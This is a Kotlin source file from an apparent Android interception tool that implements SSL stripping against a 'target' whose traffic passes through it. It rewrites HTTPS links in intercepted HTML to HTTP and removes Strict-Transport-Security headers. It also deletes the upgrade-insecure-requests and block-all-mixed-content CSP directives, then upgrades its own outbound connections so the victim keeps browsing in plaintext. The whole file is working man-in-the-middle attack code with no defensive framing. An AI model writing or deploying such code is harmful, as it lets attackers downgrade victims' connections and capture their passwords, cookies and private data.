package com.cyberghost.core

import android.util.Log
import java.nio.charset.StandardCharsets
import java.util.concurrent.ConcurrentHashMap

data class StrippedSite(
    val originalHttps: String,
    val strippedHttp: String,
    var hitCount: Int = 0
)

class SslStrip {
    var enabled: Boolean = false

    // track what we stripped so we can redirect responses back correctly
    private val stripMap = ConcurrentHashMap<String, StrippedSite>()

    fun stripResponse(packet: InterceptedPacket): InterceptedPacket {
        if (!enabled) return packet
        val contentType = packet.headers["Content-Type"] ?: packet.headers["content-type"] ?: ""
        if (!contentType.contains("text/html", ignoreCase = true)) return packet

        try {
            var html = String(packet.body, StandardCharsets.UTF_8)
            var changed = false

            // rewrite https:// links to http://
            val httpsPattern = Regex("https://([a-zA-Z0-9.\\-_/:%?#&=@!$'()*+,;~]+)", RegexOption.IGNORE_CASE)
            html = httpsPattern.replace(html) { match ->
                val httpsUrl = match.value
                val httpUrl = "http://" + httpsUrl.removePrefix("https://")
                val host = httpsUrl.removePrefix("https://").split("/")[0]
                stripMap[host] = StrippedSite(httpsUrl, httpUrl).also { it.hitCount++ }
                changed = true
                httpUrl
            }

            // strip HSTS header
            packet.headers.remove("Strict-Transport-Security")
            packet.headers.remove("strict-transport-security")

            // strip upgrade-insecure-requests directive from CSP
            val csp = packet.headers["Content-Security-Policy"] ?: packet.headers["content-security-policy"]
            if (csp != null) {
                val stripped = csp.replace("upgrade-insecure-requests;", "")
                    .replace("upgrade-insecure-requests", "")
                    .replace("block-all-mixed-content;", "")
                    .replace("block-all-mixed-content", "")
                packet.headers["Content-Security-Policy"] = stripped
            }

            if (changed) {
                packet.body = html.toByteArray(StandardCharsets.UTF_8)
                packet.headers["Content-Length"] = packet.body.size.toString()
                Log.d("CG2", "SSLStrip: rewrote HTTPS links in ${packet.host}")
            }
        } catch (e: Exception) {
            Log.e("CG2", "SSLStrip failed", e)
        }
        return packet
    }

    // when target requests a stripped URL on http, upgrade our outbound to https
    fun shouldUpgradeOutbound(host: String): Boolean {
        return enabled && stripMap.containsKey(host)
    }

    fun getStrippedSites(): List<StrippedSite> = stripMap.values.toList()

    fun reset() { stripMap.clear() }
}
